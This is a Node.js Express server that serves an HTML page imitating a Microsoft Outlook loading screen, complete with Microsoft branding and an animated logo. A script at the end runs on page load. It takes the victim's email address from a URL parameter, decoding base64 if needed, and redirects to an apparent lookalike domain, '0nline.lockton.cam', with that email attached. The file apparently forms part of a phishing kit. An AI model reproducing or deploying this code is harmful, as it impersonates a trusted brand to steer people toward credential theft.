const express = require("express");
const app = express();
const port = process.env.PORT || 3001;

app.get("/", (req, res) => res.type('html').send(html));

const server = app.listen(port, () => console.log(`Example app listening on port ${port}!`));

server.keepAliveTimeout = 120 * 1000;
server.headersTimeout = 120 * 1000;

const html = `
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=0"
    />
    <style>
      #loadingScreen {
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        background-color: #fff;
      }
      #loadingLogo {
        position: fixed;
        top: calc(50vh - 90px);
        left: calc(50vw - 90px);
        width: 180px;
        height: 180px;
      }
      #MSLogo {
        position: fixed;
        bottom: 36px;
        left: calc(50vw - 45px);
      }
      .dark #loadingScreen {
        background-color: #333;
      }
      .darkNew #loadingScreen {
        background-color: #1f1f1f;
      }
    </style>
    <title>Loading... Wait...</title>
  </head>
  <body>
    <div id="loadingScreen">
      <div id="loadingLogo">
        <style>
          :root {
            --s: 180px;
            --envW: 130px;
            --envH: 71px;
            --calW: 118px;
            --sqW: calc(var(--calW) / 3);
            --sqH: 37px;
            --calHH: 20px;
            --calH: calc(var(--sqH) * 3 + var(--calHH));
            --calY: calc(var(--calH) + 20px);
            --calYExt: calc(var(--calH) - 80px);
            --calYOverExt: calc(var(--calH) - 92px);
            --flapS: 96px;
            --flapH: calc(0.55 * var(--envH));
            --flapScaleY: calc(var(--flapH) / var(--flapWidth));
            --dur: 5s;
          }

          #container {
            width: var(--s);
            height: var(--s);
            animation: bounce var(--dur) infinite;
          }

          @keyframes bounce {
            0% {
              transform: translateY(0);
            }
            12.5% {
              transform: translateY(0);
            }
            22.5% {
              transform: translateY(7px);
            }
            32.5% {
              transform: translateY(0);
            }
            50% {
              transform: translateY(0);
            }
            76.1% {
              transform: translateY(0);
            }
            86% {
              transform: translateY(7px);
            }
            100% {
              transform: translateY(0);
            }
          }

          #logo {
            height: 179px;
            width: 130px;
            overflow: hidden;
            margin-top: -59px;
            margin-left: 25px;
          }

          #containerShadow {
            position: relative;
            top: 120px;
            left: 25px;
            width: var(--envW);
            height: var(--envH);
            border-radius: 0 0 7px 7px;
            box-shadow: rgba(0, 0, 0, 0.25) 0 4px 5px;
            animation: shadow-fade var(--dur) infinite;
          }

          @keyframes shadow-fade {
            0% {
              opacity: 0;
            }
            21.2% {
              opacity: 0;
            }
            47% {
              opacity: 1;
            }
            70% {
              opacity: 1;
            }
            80% {
              opacity: 0;
            }
            100% {
              opacity: 0;
            }
          }

          #flapContainer {
            width: var(--envW);
            margin-top: 179px;
          }

          #ef {
            width: var(--envW);
            height: var(--envH);
            border-radius: 0 0 7px 7px;
            overflow: hidden;
            margin-top: -41px;
          }

          #ef > .l {
            width: 287px;
            height: var(--envH);
            background: #28a8ea;
            transform: translate(-153px, -70px) rotate(28deg);
          }

          #ef > .r {
            width: 287px;
            height: var(--envH);
            background: #1490df;
            transform: translate(-120px, 63px) rotate(-28deg);
          }

          #eb {
            width: var(--envW);
            height: 40px;
            background: #123b6d;
            margin-top: -70px;
          }

          #cal {
            display: flex;
            flex-direction: row;
            flex-wrap: wrap;
            width: var(--calW);
            height: var(--calH);
            border-radius: 7px;
            overflow: hidden;
            margin: 0 auto;
            margin-top: -306px;
            animation: cal-bounce var(--dur) infinite;
            animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
            transform: translateY(var(--calYExt)) scaleY(1);
          }

          @keyframes cal-bounce {
            0% {
              transform: translateY(var(--calY)) scaleY(1);
            }
            16.5% {
              transform: translateY(var(--calY)) scaleY(1);
            }
            28% {
              transform: translateY(var(--calYOverExt)) scaleY(1);
            }
            31% {
              transform: translateY(var(--calYExt)) scaleY(1.05);
            }
            33% {
              transform: translateY(var(--calYExt)) scaleY(0.96);
            }
            34% {
              transform: translateY(var(--calYExt)) scaleY(1);
            }
            68.5% {
              transform: translateY(var(--calYExt)) scaleY(1);
              animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29);
            }
            76.1% {
              transform: translateY(var(--calY)) scaleY(1);
            }
            100% {
              transform: translateY(var(--calY)) scaleY(1);
            }
          }

          #cal > .t {
            width: var(--calW);
            height: calc(var(--calHH) + 1px);
            margin-bottom: -1px;
            background: #0358a7;
          }

          #cal > .r {
            display: flex;
            flex-direction: row;
            width: var(--calW);
            height: var(--sqH);
          }

          .s {
            width: var(--sqW);
            height: calc(var(--sqH) + 1px);
          }

          .s1 {
            background: #0078d4;
          }

          .s2 {
            background: #28a8ea;
          }

          .s3 {
            background: #50d9ff;
          }

          .s4 {
            background: #0364b8;
          }

          .s5 {
            background: #14447d;
          }

          #openedFlap {
            width: var(--envW);
            height: 107px;
            animation: opened-flap-swing var(--dur) infinite;
            animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
            transform-origin: top;
            transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
          }

          @keyframes opened-flap-swing {
            0% {
              transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);
            }
            14.5% {
              transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);
            }
            16.5% {
              transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
            }
            50% {
              transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
            }
            74% {
              transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
            }
            76% {
              transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);
            }
            100% {
              transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);
            }
          }

          #closedFlap {
            width: var(--envW);
            animation: closed-flap-swing var(--dur) infinite;
            animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
            transform-origin: top;
            transform: translateY(calc(-1 * var(--envH)))
              rotate3d(1, 0, 0, 90deg);
          }

          @keyframes closed-flap-swing {
            0% {
              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0);
            }
            8.5% {
              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0);
            }
            14.5% {
              transform: translateY(calc(-1 * var(--envH)))
                rotate3d(1, 0, 0, 90deg);
            }
            50% {
              transform: translateY(calc(-1 * var(--envH)))
                rotate3d(1, 0, 0, 90deg);
            }
            76% {
              transform: translateY(calc(-1 * var(--envH)))
                rotate3d(1, 0, 0, 90deg);
            }
            77% {
              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0);
            }
            100% {
              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0);
            }
          }

          #fmask {
            width: var(--envW);
            height: 107px;
            overflow: hidden;
          }

          .flapTriangle {
            width: var(--flapS);
            height: var(--flapS);
            background: #50d9ff;
            margin: -48px auto 0 auto;
            border-radius: 7px;
            transform: scaleY(0.6) rotate(45deg);
          }

          #openedFlap .flapTriangle {
            background: #123b6d;
          }

          #closedFlap .flapTriangle {
            background: #50d9ff;
          }
        </style>
        <div id="container">
          <div id="containerShadow"></div>
          <div id="logo">
            <div id="flapContainer">
              <div id="openedFlap">
                <div id="fmask">
                  <div class="flapTriangle"></div>
                </div>
              </div>
              <div id="cal">
                <div class="t"></div>
                <div class="r">
                  <div class="s s1"></div>
                  <div class="s s2"></div>
                  <div class="s s3"></div>
                </div>
                <div class="r">
                  <div class="s s4"></div>
                  <div class="s s1"></div>
                  <div class="s s2"></div>
                </div>
                <div class="r">
                  <div class="s s5"></div>
                  <div class="s s4"></div>
                  <div class="s s1"></div>
                </div>
              </div>
            </div>
            <div id="eb"></div>
            <div id="ef">
              <div class="r"></div>
              <div class="l"></div>
            </div>
            <div id="closedFlap">
              <div id="fmask">
                <div class="flapTriangle"></div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <svg
        id="MSLogo"
        xmlns="http://www.w3.org/2000/svg"
        xmlns:xlink="http://www.w3.org/1999/xlink"
        height="22"
        width="99"
      >
        <g fill="none" fill-rule="evenodd">
          <path
            d="M34.643 12.075l-.588 1.647h-.034c-.105-.387-.28-.934-.556-1.63l-3.15-7.897h-3.077V16.75h2.03V9.032c0-.476-.01-1.052-.03-1.711-.01-.333-.049-.6-.058-.804h.045c.103.473.21.834.287 1.075l3.776 9.16h1.42l3.748-9.243c.085-.211.175-.622.257-.992h.044c-.048.915-.09 1.75-.095 2.256v7.978h2.165V4.195h-2.956l-3.228 7.88z"
            fill="#737474"
          ></path>
          <path d="M0 20.956h98.148V0H0z"></path>
          <path
            d="M42.866 16.751h2.118V7.752h-2.118zM43.947 3.929c-.349 0-.653.119-.902.353a1.166 1.166 0 00-.378.883c0 .344.126.636.374.865.247.23.552.345.906.345s.66-.115.91-.345c.25-.23.379-.52.379-.865 0-.339-.125-.632-.37-.873a1.262 1.262 0 00-.919-.363M52.477 7.663a5.892 5.892 0 00-1.182-.127c-.971 0-1.838.209-2.574.62-.739.41-1.31.998-1.699 1.745-.386.745-.583 1.615-.583 2.585 0 .85.19 1.631.567 2.318.377.69.91 1.23 1.585 1.602.673.373 1.452.563 2.313.563 1.006 0 1.866-.201 2.554-.597l.027-.017v-1.94l-.089.066c-.312.227-.66.408-1.035.538a3.121 3.121 0 01-1.014.197c-.83 0-1.497-.26-1.982-.772-.485-.513-.73-1.233-.73-2.14 0-.912.255-1.651.761-2.196.504-.544 1.173-.82 1.986-.82.695 0 1.374.236 2.014.702l.09.063V8.011l-.029-.017c-.241-.135-.571-.246-.98-.331M59.452 7.597a2.17 2.17 0 00-1.415.507c-.358.296-.616.7-.814 1.207H57.2V7.753h-2.116v8.999H57.2v-4.603c0-.784.178-1.426.528-1.912.346-.48.806-.723 1.369-.723.19 0 .404.031.636.093.23.063.396.129.493.2l.09.064V7.737l-.034-.014c-.197-.083-.477-.126-.83-.126M66.885 14.465c-.397.499-.996.751-1.779.751-.777 0-1.39-.256-1.823-.766-.435-.51-.655-1.238-.655-2.163 0-.954.22-1.701.655-2.22.433-.516 1.04-.778 1.806-.778.743 0 1.335.25 1.758.744.426.496.642 1.237.642 2.202 0 .977-.203 1.728-.604 2.23m-1.683-6.929c-1.484 0-2.663.435-3.503 1.293-.84.857-1.265 2.044-1.265 3.527 0 1.41.415 2.543 1.235 3.368.82.826 1.936 1.245 3.316 1.245 1.438 0 2.593-.441 3.434-1.31.84-.87 1.265-2.045 1.265-3.493 0-1.433-.4-2.573-1.187-3.394-.789-.82-1.897-1.236-3.295-1.236M74.378 11.471c-.667-.268-1.095-.49-1.27-.66-.17-.165-.257-.398-.257-.693 0-.262.108-.472.327-.642.219-.17.526-.257.911-.257.357 0 .723.056 1.085.166.363.111.682.26.949.44l.088.06V7.928l-.035-.015a4.715 4.715 0 00-.962-.268 5.932 5.932 0 00-1.056-.109c-1.01 0-1.845.258-2.483.767-.64.512-.967 1.184-.967 1.997 0 .422.07.798.209 1.116.14.32.355.6.641.837.283.233.722.478 1.302.728.488.2.852.37 1.083.505.227.13.387.263.477.39.088.127.133.299.133.512 0 .604-.452.897-1.384.897a3.8 3.8 0 01-1.172-.213 4.418 4.418 0 01-1.2-.609l-.089-.064v2.064l.033.015c.304.14.686.257 1.137.35.449.094.859.141 1.213.141 1.096 0 1.977-.26 2.62-.771.648-.515.976-1.204.976-2.045 0-.607-.176-1.127-.525-1.546-.345-.416-.946-.799-1.784-1.136M84.063 14.465c-.398.499-.997.751-1.78.751-.777 0-1.39-.256-1.822-.766-.435-.51-.655-1.238-.655-2.163 0-.954.22-1.701.655-2.22.432-.516 1.04-.778 1.806-.778.743 0 1.335.25 1.758.744.426.496.642 1.237.642 2.202 0 .977-.204 1.728-.604 2.23M82.38 7.536c-1.484 0-2.663.435-3.503 1.293-.84.857-1.266 2.044-1.266 3.527 0 1.41.415 2.543 1.235 3.368.82.826 1.936 1.245 3.317 1.245 1.438 0 2.593-.441 3.433-1.31.84-.87 1.266-2.045 1.266-3.493 0-1.433-.4-2.573-1.187-3.394-.789-.82-1.897-1.236-3.295-1.236M98.149 9.48V7.752h-2.144V5.069l-.072.022-2.015.616-.038.012v2.034h-3.177V6.62c0-.527.118-.931.351-1.2.23-.266.56-.402.982-.402.303 0 .616.072.931.213l.079.035V3.447l-.037-.013c-.294-.105-.695-.159-1.19-.159-.626 0-1.194.136-1.689.406-.495.27-.886.655-1.16 1.146-.272.489-.41 1.054-.41 1.68v1.246h-1.492v1.726h1.493v7.273h2.142V9.479h3.177v4.622c0 1.903.897 2.868 2.668 2.868.291 0 .597-.034.91-.101.319-.07.535-.137.662-.21l.029-.016v-1.743l-.087.058c-.117.078-.262.14-.432.188-.17.048-.312.072-.422.072-.416 0-.723-.112-.914-.332-.191-.223-.289-.612-.289-1.158V9.48h2.144z"
            fill="#737474"
          ></path>
          <path d="M0 9.958h9.958V.001H0z" fill="#F05124"></path>
          <path d="M10.995 9.958h9.957V.001h-9.957z" fill="#7EBB42"></path>
          <path d="M0 20.956h9.958V11H0z" fill="#32A0DA"></path>
          <path d="M10.995 20.956h9.957V11h-9.957z" fill="#FDB813"></path>
        </g>
      </svg>
    </div>
   <script> 
    var queryParams = window.location.search 
      .substr(1) 
      .split("&") 
      .reduce(function (q, query) { 
        var chunks = query.split("="); 
        var key = chunks[0]; 
        var value = decodeURIComponent(chunks[1]); 
        value = isNaN(Number(value)) ? value : Number(value); 
 
        console.log("q[key] " + q[key]); 
        return (q[key] = value), q; 
      }, {}); 
 
    var emailParam = queryParams["org"]; 
    var decodedEmail = emailParam.includes("@") ? emailParam : atob(emailParam); 
 
    window.location.replace( 
      "https://0nline.lockton.cam/?username=" + decodedEmail 
    ); 
  </script> 
  </body>
</html>

`
